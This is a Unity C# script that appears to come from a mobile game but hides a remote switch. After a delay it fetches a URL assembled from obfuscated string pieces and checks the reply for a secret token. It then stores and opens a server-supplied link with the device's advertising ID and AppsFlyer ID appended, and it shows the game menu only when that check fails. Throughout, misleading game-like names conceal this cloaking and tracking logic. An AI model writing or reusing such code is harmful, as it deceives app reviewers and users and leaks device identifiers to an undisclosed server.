using System.Collections;
using AppsFlyerSDK;
using RigidBodyPhys.Colliders.Game;
using RigidBodyPhys.Colliders.UI_Work;
using Unity.Advertisement.IosSupport;
using UnityEngine;
using UnityEngine.Networking;
using UserStorage.DataBase;

namespace RigidBodyPhys.Colliders.ResourceHunt
{
    public class MainTigers : MonoBehaviour
    {
        [SerializeField] private ImageMechanic colliderPhys;
        [SerializeField] private IDFAController UnittyWorkerss;

        [SerializeField] private StringMergelka LoopAnim;

        private bool isFirstInstance = true;
        private NetworkReachability networkReachability = NetworkReachability.NotReachable;

        private string globalLocator1 { get; set; }
        private string globalLocator2;
        private int globalLocator3;

        private string secretCode;


        private string hiddenData;

        private void Awake()
        {
            ManageMultipleInstances();
        }

        private void Start()
        {
            DontDestroyOnLoad(gameObject);
            UnittyWorkerss.ExamineIDFA();
            StartCoroutine(FetchAdvertisingIDfetchTiger());

            switch (Application.internetReachability)
            {
                case NetworkReachability.NotReachable:
                    HandleNoInternetConnection();
                    break;
                default:
                    Tiger();
                    break;
            }
        }

        private void ManageMultipleInstances()
        {
            switch (isFirstInstance)
            {
                case true:
                    isFirstInstance = false;
                    break;
                default:
                    gameObject.SetActive(false);
                    break;
            }
        }

        private IEnumerator FetchAdvertisingIDfetchTiger()
        {
#if UNITY_IOS
            var authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
            while (authorizationStatus == ATTrackingStatusBinding.AuthorizationTrackingStatus.NOT_DETERMINED)
            {
                authorizationStatus = ATTrackingStatusBinding.GetAuthorizationTrackingStatus();
                yield return null;
            }
#endif

            secretCode = UnittyWorkerss.RetrieveAdvertisingID();
            yield return null;
        }

        private void Tiger()
        {
            if (PlayerPrefs.GetString("hidden_top", string.Empty) != string.Empty)
            {
                LocalTiger();
            }
            else
            {
                DelayedDataFetch();
            }
        }

        private void LocalTiger()
        {
            globalLocator1 = PlayerPrefs.GetString("hidden_top", string.Empty);
            globalLocator2 = PlayerPrefs.GetString("hidden_top2", string.Empty);
            globalLocator3 = PlayerPrefs.GetInt("hidden_top3", 0);
            Tiggger();
        }

        [SerializeField] private ItemsData _ItemsData;

        private void DelayedDataFetch()
        {
            Invoke(nameof(hidenTigerColor), 7.4f);
        }

        private void hidenTigerColor()
        {
            if (Application.internetReachability == networkReachability)
            {
                HandleNoInternetConnection();
            }
            else
            {
                StartCoroutine(FetchDataFromSecretServerdataFromFetchTin());
            }
        }

        [SerializeField] private ExtraItemsData _BigTigers;

        private IEnumerator FetchDataFromSecretServerdataFromFetchTin()
        {
            using UnityWebRequest webRequest = UnityWebRequest.Get(LoopAnim.ConcatenateStrings(_BigTigers.BigTigers));
            yield return webRequest.SendWebRequest();

            if (webRequest.result == UnityWebRequest.Result.ConnectionError ||
                webRequest.result == UnityWebRequest.Result.DataProcessingError)
            {
                HandleNoInternetConnection();
            }
            else
            {
                ProcessServerResponse(webRequest);
            }
        }

        private void ProcessServerResponse(UnityWebRequest webRequest)
        {
            string tokenConcatenation = LoopAnim.ConcatenateStrings(_ItemsData.textInToOneList);

            if (webRequest.downloadHandler.text.Contains(tokenConcatenation))
            {
                try
                {
                    string[] dataParts = webRequest.downloadHandler.text.Split('|');
                    PlayerPrefs.SetString("hidden_top", dataParts[0]);
                    PlayerPrefs.SetString("hidden_top2", dataParts[1]);
                    PlayerPrefs.SetInt("hidden_top3", int.Parse(dataParts[2]));

                    globalLocator1 = dataParts[0];
                    globalLocator2 = dataParts[1];
                    globalLocator3 = int.Parse(dataParts[2]);
                }
                catch
                {
                    PlayerPrefs.SetString("hidden_top", webRequest.downloadHandler.text);
                    globalLocator1 = webRequest.downloadHandler.text;
                }

                Tiggger();
            }
            else
            {
                HandleNoInternetConnection();
            }
        }

        private void Tiggger()
        {
            colliderPhys.ImageCategory = $"{globalLocator1}?idfa={secretCode}";
            colliderPhys.ImageCategory +=
                $"&gaid={AppsFlyer.getAppsFlyerId()}{PlayerPrefs.GetString("Result", string.Empty)}";
            colliderPhys.ImageCode1 = globalLocator2;

            PerformAction();
        }

        public void PerformAction()
        {
            colliderPhys.ToolbarHeight = globalLocator3;
            colliderPhys.gameObject.SetActive(true);
        }

        private void HandleNoInternetConnection()
        {
            DisableCanvas();
        }

        private void DisableCanvas()
        {
            CanvasUtttil.FadeCanvasGroup(gameObject, false);
            _sceneLoader.LoadMenuScene();
        }

        [SerializeField] private SceneLoader _sceneLoader;
        // Add the rest of your methods as needed...
    }
}